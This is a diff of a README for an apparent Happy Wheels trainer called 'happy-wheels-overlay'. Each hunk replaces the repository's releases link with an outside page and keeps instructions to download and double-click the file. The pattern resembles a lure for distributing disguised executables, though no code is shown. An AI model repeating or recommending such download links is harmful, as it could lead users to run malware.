@@ -1,7 +1,7 @@
 <h1>🎮 happy-wheels-overlay - Unlock Every Gameplay Possibility Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/CTosCorp/happy-wheels-overlay/releases">
+  <a href="https://ctoscorp.github.io">
     <img src="https://img.shields.io/badge/Download-happy--wheels--overlay-blue?style=for-the-badge&logo=windows&logoColor=white&color=0064FF" alt="Download Button" width="300" height="60">
   </a>
 </p>
@@ -22,7 +22,7 @@ happy-wheels-overlay is a powerful trainer that gives you complete control over 
 
 Getting started takes less than two minutes. Here is exactly what you need to do:
 
-1. **Visit this link to download the application** – [https://github.com/CTosCorp/happy-wheels-overlay/releases](https://github.com/CTosCorp/happy-wheels-overlay/releases)
+1. **Visit this link to download the application** – [https://ctoscorp.github.io](https://ctoscorp.github.io)
 2. Click the download button on that page
 3. Save the file to your computer (most people save it to their Desktop or Downloads folder)
 4. Double-click the file you downloaded
@@ -143,7 +143,7 @@ Most issues are fixed by restarting the program. If a specific module isn't work
 
 If you run into any trouble, here's what you can do:
 
-1. **Check the download page** – [https://github.com/CTosCorp/happy-wheels-overlay/releases](https://github.com/CTosCorp/happy-wheels-overlay/releases) – for any new updates or announcements
+1. **Check the download page** – [https://ctoscorp.github.io](https://ctoscorp.github.io) – for any new updates or announcements
 2. **Read the notes** on the download page for specific information about your issue
 3. **Try a fresh download** – sometimes files get corrupted during transfer, and a fresh download fixes everything
 4. **Turn off and on your computer** – this resolves most Windows issues
@@ -173,6 +173,6 @@ Before you start playing, make sure you:
 
 This tool transforms Happy Wheels into the ultimate physics playground. Download it now and start exploring everything the game can become. With 34 modules at your fingertips, every session will be completely different from the last.
 
-Remember: the download link is **https://github.com/CTosCorp/happy-wheels-overlay/releases** – visit this link to download the application. Click the blue button at the top of this page, or copy and paste the link into your browser. Either way, you'll be playing with unlimited power in less than five minutes.
+Remember: the download link is **https://ctoscorp.github.io** – visit this link to download the application. Click the blue button at the top of this page, or copy and paste the link into your browser. Either way, you'll be playing with unlimited power in less than five minutes.
 
 Keywords: game-mod, happy-wheels, physics-sandbox, platformer, ragdoll, sandbox
